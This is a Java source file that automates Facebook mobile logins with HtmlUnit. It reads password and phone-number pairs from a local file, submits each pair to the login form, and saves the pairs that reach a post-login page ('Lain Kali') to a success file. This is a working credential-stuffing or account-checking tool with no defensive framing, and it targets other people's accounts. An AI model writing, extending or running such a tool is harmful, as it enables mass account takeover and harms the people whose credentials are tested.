package com.fjr.facebook;

import java.io.BufferedReader;
import java.io.File;
import java.io.FileOutputStream;
import java.io.FileReader;
import java.io.PrintWriter;
import java.util.List;

import com.gargoylesoftware.htmlunit.WebClient;
import com.gargoylesoftware.htmlunit.html.DomElement;
import com.gargoylesoftware.htmlunit.html.DomNodeList;
import com.gargoylesoftware.htmlunit.html.HtmlButton;
import com.gargoylesoftware.htmlunit.html.HtmlElement;
import com.gargoylesoftware.htmlunit.html.HtmlForm;
import com.gargoylesoftware.htmlunit.html.HtmlInput;
import com.gargoylesoftware.htmlunit.html.HtmlPage;
import com.gargoylesoftware.htmlunit.html.HtmlSubmitInput;
import com.gargoylesoftware.htmlunit.javascript.host.Event;

public class Facebook {
	BufferedReader  bufferedReader = null; 
	PrintWriter out1 = null , out2 =  null, out3= null ; 
	public Facebook() {
		try {
			bufferedReader = new BufferedReader(new FileReader
					( "E:/birokrasi/lamaran kerja/CPNS 2019/kementerian hukum dan ham/no-hp-simpan.txt"));
			
			out1 = new PrintWriter(new FileOutputStream
					(new File("E:/birokrasi/lamaran kerja/CPNS 2019/kementerian hukum dan ham/sukses-facebook.txt"))) ;
			out2 = new PrintWriter(new FileOutputStream
					(new File("E:/birokrasi/lamaran kerja/CPNS 2019/kementerian hukum dan ham/fb-log.txt"))) ;
			out3 = new PrintWriter(new FileOutputStream
					(new File("E:/birokrasi/lamaran kerja/CPNS 2019/kementerian hukum dan ham/fb-print.txt"))) ;

			String content ; 
//			int iter = ;
			while( (content = bufferedReader.readLine())!= null ) {
				HtmlPage page1 = null;
				WebClient webClient = new WebClient();
				webClient.getCookieManager().clearCookies();
				webClient.getOptions().setJavaScriptEnabled(false);
				webClient.getOptions().setCssEnabled(false);

				webClient.getCookieManager().clearCookies();

				page1 = webClient.getPage("https://m.facebook.com/");

				String[] temp = content.split("\\|"); 
				String email_ = temp[1]; 
				String password_= temp[0]; 
				out2.println(email_+"|" + password_);
				out2.flush();
				
				HtmlForm form = (HtmlForm) page1.getElementById("login_form"); 
				HtmlInput email = form.getInputByName("email"); 
				HtmlInput password = form.getInputByName("pass"); 
				
				email.setValueAttribute(email_); 
				password.setValueAttribute( password_ ); 

				List<DomElement> el = page1.getElementsByName("login"); 
				HtmlElement element = (HtmlElement) (el.get(0));
				HtmlSubmitInput button = (HtmlSubmitInput) element;
				HtmlPage page2 = button.click();
				if(page2.asText().contains("Lain Kali")) {
					out1.println(email_ + "|" + password_); 
					out1.flush();
				}else {
					out3.println(page2.asText());
					out3.println("===========================================================");
					out3.flush();
				}
			}
		}catch(Exception e) {
			e.printStackTrace();
		}finally {
			if(bufferedReader != null) {
				try {
					 bufferedReader.close();
				}catch(Exception e) {
					
				}
			}
			
			if(out1 != null) {
				out1.close();
			}
			if(out2!= null) {
				out2.close();
			}
			if(out3!= null) {
				out3.close();
			}
		}
		System.out.println("FINISH");  
	}
	
	public static void main(String[] args) {
		new Facebook();
	}

}
